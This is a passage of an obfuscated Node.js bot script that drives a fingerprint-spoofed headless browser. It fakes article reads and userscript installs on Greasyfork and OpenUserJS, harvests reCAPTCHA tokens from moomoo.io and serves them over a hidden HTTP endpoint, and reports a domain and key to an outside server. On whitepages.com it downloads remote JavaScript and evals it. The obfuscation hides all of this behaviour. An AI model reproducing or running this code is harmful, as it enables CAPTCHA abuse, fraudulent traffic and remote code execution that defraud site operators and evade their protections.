      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0xf, 'k&HT') + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x1, '9!nB') + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + W(0x16) + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + V(0x7) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + X(0xc, 'TUvN') + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + W(0xd)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + W(0x1f) + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    X(0x14, 'elZP') + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + X(0x11, '7Em9') + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + V(0x15) + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + W(0x17) + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * -0xc44 + -0x1be2 + 0x12 * 0x23b
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1154 + -0x4f * 0x19 + -0x99d)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x7ea + -0x2f1 * 0xd + 0x3 * 0xa3d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x183f + -0x1bd1 + 0x3474), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x71 * 0x23 + 0x6 * 0x2cd + 0x167 * -0x17;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x4a8 * -0x4 + 0x86a + 0xa36; w < getRandomInt(-0x1 * -0x2091 + -0x6b * -0x5 + -0x22a7, 0x1 * 0x9e1 + 0xa17 * -0x1 + 0x1 * 0x3b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x6df1 + 0x2 * 0xc0bc + -0x2b * 0xf5);
        }
      }();
    }, 0x1 * -0xd30 + -0xa * -0x31d + 0x6b * -0x2a), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x6 * -0x2ea + -0x1027 * -0x1 + 0x155;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes'](Y(0x4)))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0xdf * 0x25 + -0xf59 * -0x1 + -0x2 * -0x871, -0x1007 * 0x1 + -0xeab * -0x2 + -0x3 * 0x45f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x1d6 + -0x1 * 0x5153 + 0xbc9 * 0x11);
    }, 0x961 + -0x2219 + -0xc8e * -0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x110 * 0x1 + 0x24a1 * 0x1 + -0x25b1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x4b6 + 0x1940 * -0x1 + 0x29ae), await u['evaluate'](() => {
            const Z = b;
            let v = new XMLHttpRequest();
            v[Z(0x0, 'M]n2')]('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xb * -0xc7 + -0x22e1 * 0x1 + 0x2b6e), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x125 * 0x45a + -0x58f * -0x2 + 0x8b580);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x22bd + 0x1 * 0xc56 + -0x799 * -0x3);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x242f + -0x1 * 0xda0 + -0x15c7);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * -0x1a7d + 0xfa1 + 0x44e9);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = d,
    a3 = c,
    a2 = b;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const a0 = b,
          A = j['random']();
        return [
          A,
          A['includes'](a0(0x6, '@C!h'))
        ];
      }()),
      v = function(A, B = 0x35 * -0x33 + -0x75 * 0xb + 0xf97) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x689 * 0x3 + 0x1f37 + -0x32d1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x16a5 + -0x669 + 0x1d0e, D['indexOf']('\x20'));
        return B ? E['slice'](-0xe * -0x95 + -0xb25 * 0x1 + -0x2ff * -0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x53 * -0x4d + 0x191b * -0x1 + 0x1db6 * 0x3),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + a1(0x5),
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x47 * -0x95 + -0x21ab + 0x86 * 0x3c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + a2(0x19, 'P4ra') + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + a2(0x3, '4Zl3') + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + a3(0x13) + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a4(0x1c) + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
